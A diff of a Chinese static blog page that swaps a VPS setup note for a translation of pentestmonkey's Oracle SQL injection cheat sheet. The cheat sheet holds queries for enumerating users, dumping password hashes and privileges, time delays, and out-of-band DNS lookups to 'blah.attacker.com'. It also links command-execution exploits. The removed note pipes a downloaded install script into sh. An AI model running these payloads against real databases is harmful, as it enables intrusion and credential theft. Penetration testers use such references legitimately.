@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>
     
-  新建VPS应该做的事情 - 雪地
+  Oracle注入速查表 - 雪地
   
   </title>
   
@@ -105,10 +105,10 @@
       <div class="markdown-body article-wrap">
        <div class="article">
           
-          <h1>新建VPS应该做的事情</h1>
+          <h1>Oracle注入速查表</h1>
      
         <div class="read-more clearfix">
-          <span class="date">2016/4/9 21:8 下午</span>
+          <span class="date">2015/8/28 17:30 下午</span>
 
           
            
@@ -123,58 +123,214 @@
       </div><!-- article -->
 
       <div class="article-content">
-      <ol>
-<li><p>创建root密码</p>
+      <p><small>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></small></p>
 
-<pre><code>passwd
-</code></pre></li>
-<li><p>安装oh-my-zsh</p>
-
-<p>这里是debian， 所以使用apt-get</p>
-
-<ol>
-<li><p>当然，首先，update &amp; upgrade apt-get</p>
-
-<pre><code>apt-get update; apt-get upgrade
-</code></pre></li>
-<li><p>安装zsh、git、pip</p>
-
-<pre><code>sudo apt-get install zsh git python-pip
-</code></pre></li>
-<li><p>安装oh my zsh</p>
-
-<pre><code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
-</code></pre></li>
-</ol></li>
-</ol>
+<p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以&quot;<strong><code>-priv</code></strong>&ldquo;标注。</p>
 
 <span id="more"></span><!-- more -->
 
-<pre><code>4. 更换默认shell为zsh
+<p>探测版本：</p>
 
-        chsh -s /usr/bin/zsh
-    这个路径不一定，如果不知道，可以使用```which zsh```来查看zsh位置
-
-5. 上传.zshrc
-
-        scp ~/.zshrc root@*.*.*.*:~/
-    此处```*```为ip地址  
-    然后就要修改.zshrc了
-
-    1. 改zsh对应路径
-    2. 还原插件列表
-    3. 检查个性化设置如alias
-
-6. 安装shadowsocks
-
-    pip install shadowsocks
-
-7. 建立 /etc/shadowsocks.json
-
-8. 在 /etc/rc.local 中加入shadowsocks的开启自启动
-
-        /usr/bin/python /usr/local/bin/ssserver -c /etc/shadowsocks.json -d start
+<pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
+SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
+SELECT version FROM v$instance;
 </code></pre>
+
+<p>注释：</p>
+
+<pre><code>SELECT 1 FROM dual — comment
+</code></pre>
+
+<p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p>
+
+<p>当前用户：</p>
+
+<pre><code>SELECT user FROM dual
+</code></pre>
+
+<p>列出所有用户：</p>
+
+<pre><code>SELECT username FROM all_users ORDER BY username;
+SELECT name FROM sys.user$; — priv
+</code></pre>
+
+<p>列出密码哈希：</p>
+
+<pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
+SELECT name,spare4 FROM sys.user$ — priv, 11g
+</code></pre>
+
+<p>密码破解：</p>
+
+<p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p>
+
+<p>列出权限：</p>
+
+<pre><code>SELECT * FROM session_privs; —当前用户的权限
+SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
+SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
+SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
+</code></pre>
+
+<p>列出DBA账户：</p>
+
+<pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
+</code></pre>
+
+<p>当前数据库：</p>
+
+<pre><code>SELECT global_name FROM global_name;
+SELECT name FROM v$database;
+SELECT instance_name FROM v$instance;
+SELECT SYS.DATABASE_NAME FROM DUAL;
+</code></pre>
+
+<p>列出数据库：</p>
+
+<pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
+</code></pre>
+
+<p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p>
+
+<p>列出字段名：</p>
+
+<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
+SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
+</code></pre>
+
+<p>列出表名：</p>
+
+<pre><code>SELECT table_name FROM all_tables;
+SELECT owner, table_name FROM all_tables;
+</code></pre>
+
+<p>通过字段名找到对应表：</p>
+
+<pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
+</code></pre>
+
+<p>— 注: 表名都是大写</p>
+
+<p>查询第N行：</p>
+
+<pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
+</code></pre>
+
+<p>查询第N个字符：</p>
+
+<pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
+</code></pre>
+
+<p>按位与(Bitwise AND)：</p>
+
+<pre><code>SELECT bitand(6,2) FROM dual; — 返回2
+SELECT bitand(6,1) FROM dual; — 返回0
+</code></pre>
+
+<p>ASCII值转字符：</p>
+
+<pre><code>SELECT chr(65) FROM dual; — 返回A
+</code></pre>
+
+<p>字符转ASCII码：</p>
+
+<pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
+</code></pre>
+
+<p>类型转换：</p>
+
+<pre><code>SELECT CAST(1 AS char) FROM dual;
+SELECT CAST(’1′ AS int) FROM dual;
+</code></pre>
+
+<p>拼接字符：</p>
+
+<pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
+</code></pre>
+
+<p>IF语句：</p>
+
+<pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
+</code></pre>
+
+<p>— 跟SELECT语句在一起时不太管用</p>
+
+<p>Case语句：</p>
+
+<pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
+SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
+</code></pre>
+
+<p>绕过引号：</p>
+
+<pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
+</code></pre>
+
+<p>延时：</p>
+
+<pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
+SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
+SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
+</code></pre>
+
+<p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p>
+
+<p>发送DNS请求：</p>
+
+<pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
+</code></pre>
+
+<p>命令执行：</p>
+
+<p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p>
+
+<p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p>
+
+<p>本地文件读取：</p>
+
+<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p>
+
+<pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
+</code></pre>
+
+<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了Oracle Express</p>
+
+<p>主机名称、IP地址：</p>
+
+<pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT host_name FROM v$instance;
+SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
+SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
+</code></pre>
+
+<p>定位DB文件：</p>
+
+<pre><code>SELECT name FROM V$DATAFILE;
+</code></pre>
+
+<p>默认系统和数据库：</p>
+
+<pre><code>SYSTEM
+SYSAUX
+</code></pre>
+
+<h3 id="toc_0">额外小贴士：</h3>
+
+<p>一个字符串列出所有表名：</p>
+
+<pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,&#39;) from all_tables 
+</code></pre>
+
+<p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p>
+
+<p>盲注排序：</p>
+
+<pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
+</code></pre>
+
+<p>— 你必须知道两个拥有相同数据类型的字段名才能用</p>
 
       </div>
 
@@ -182,16 +338,16 @@
         <div class="large-6 columns">
         <p class="text-left" style="padding:15px 0px;">
       
-          <a href="14540480758140.html" 
-          title="Previous Post: Notes for "ICMLC2009-FabioRoli.pdf"">&laquo; Notes for "ICMLC2009-FabioRoli.pdf"</a>
+          <a href="14608288193470.html" 
+          title="Previous Post: 2015暑假">&laquo; 2015暑假</a>
       
         </p>
         </div>
         <div class="large-6 columns">
       <p class="text-right" style="padding:15px 0px;">
       
-          <a  href="14608288193470.html" 
-          title="Next Post: 2015暑假">2015暑假 &raquo;</a>
+          <a  href="14608288742293.html" 
+          title="Next Post: 解决Python的pytesseract库执行时报错">解决Python的pytesseract库执行时报错 &raquo;</a>
       
       </p>
         </div>
